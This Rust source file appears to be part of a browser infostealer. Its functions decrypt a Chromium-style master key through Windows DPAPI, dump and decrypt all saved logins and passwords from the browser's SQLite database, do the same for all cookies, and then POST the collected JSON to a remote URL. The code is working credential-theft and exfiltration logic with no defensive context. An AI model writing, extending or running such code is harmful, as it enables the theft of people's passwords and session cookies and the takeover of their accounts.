use crate::crypto;
use anyhow::anyhow;
use base64::decode;
use reqwest;
use serde_json::from_str;
use serde_json::json;
use sqlite;

pub fn get_key(key_dir: &std::path::PathBuf) -> Result<Vec<u8>, anyhow::Error> {
    if let Some(parent) = key_dir.parent() {
        let new_key_dir = parent.join("key.bak");
        std::fs::copy(key_dir, &new_key_dir)?;
        let obj = std::fs::read_to_string(new_key_dir)?;
        let obj: serde_json::Value = from_str(&obj)?;
        if let Some(res) = &obj["os_crypt"]["encrypted_key"].as_str() {
            return Ok(crypto::dpapi_decrypt(decode(res)?[5..].to_vec()));
        }
    }
    Err(anyhow!(1))
}

pub fn get_login(
    login_dir: &std::path::PathBuf,
    key: &Vec<u8>,
) -> Result<serde_json::Value, anyhow::Error> {
    if let Some(parent) = login_dir.parent() {
        let new_login_dir = parent.join("login.bak");
        std::fs::copy(login_dir, &new_login_dir)?;
        let conn = match sqlite::Connection::open(new_login_dir) {
            Ok(conn_obj) => conn_obj,
            Err(_) => panic!("Error."),
        };
        let mut statement =
            conn.prepare("SELECT action_url, username_value, password_value FROM logins")?;
        let mut credentials = json!({});
        while let sqlite::State::Row = statement.next()? {
            let url = statement.read::<String>(0)?;
            let username = statement.read::<String>(1)?;
            let password = statement.read::<Vec<u8>>(2)?;
            let obj = json!({
                "url": url,
                "username": username,
                "password": std::str::from_utf8(&crypto::aes_decrypt(&key, password))?
            });
            match credentials.get(&url) {
                Some(_) => {
                    if let Some(cred_obj) = credentials[&url].as_array_mut() {
                        cred_obj.push(obj);
                    }
                }
                None => {
                    credentials[&url] = json!([]);
                    if let Some(cred_obj) = credentials[&url].as_array_mut() {
                        cred_obj.push(obj);
                    }
                }
            }
        }
        return Ok(json!({
            "filename": "login",
            "data": credentials
        }));
    }
    Err(anyhow!(1))
}

pub fn get_cookies(
    cookie_dir: &std::path::PathBuf,
    key: &Vec<u8>,
) -> Result<serde_json::Value, anyhow::Error> {
    if let Some(parent) = cookie_dir.parent() {
        let new_cookie_dir = parent.join("login.bak");
        std::fs::copy(cookie_dir, &new_cookie_dir)?;
        let conn = match sqlite::Connection::open(new_cookie_dir) {
            Ok(conn_obj) => conn_obj,
            Err(_) => panic!("Error."),
        };
        let mut statement =
            conn.prepare("SELECT host_key, name, value, encrypted_value FROM cookies")?;
        let mut cookies = json!({});
        while let sqlite::State::Row = statement.next()? {
            let url = statement.read::<String>(0)?;
            let name = statement.read::<String>(1)?;
            let encrypted = statement.read::<Vec<u8>>(3)?;
            let obj = json!({
                "domain": url,
                "name": name,
                "value": std::str::from_utf8(&crypto::aes_decrypt(&key, encrypted))?
            });
            match cookies.get(&url) {
                Some(_) => {
                    if let Some(cookie_obj) = cookies[&url].as_array_mut() {
                        cookie_obj.push(obj);
                    }
                }
                None => {
                    cookies[&url] = json!([]);
                    if let Some(cookie_obj) = cookies[&url].as_array_mut() {
                        cookie_obj.push(obj);
                    }
                }
            }
        }
        return Ok(json!({
            "filename": "login",
            "data": cookies
        }));
    }
    Err(anyhow!(1))
}

pub fn send_data(data: serde_json::Value, url: &str) -> Result<i32, anyhow::Error> {
    let client = reqwest::blocking::Client::new();
    let url: reqwest::Url = url.parse()?;
    client.post(url).json(&data).send()?;
    Ok(0)
}
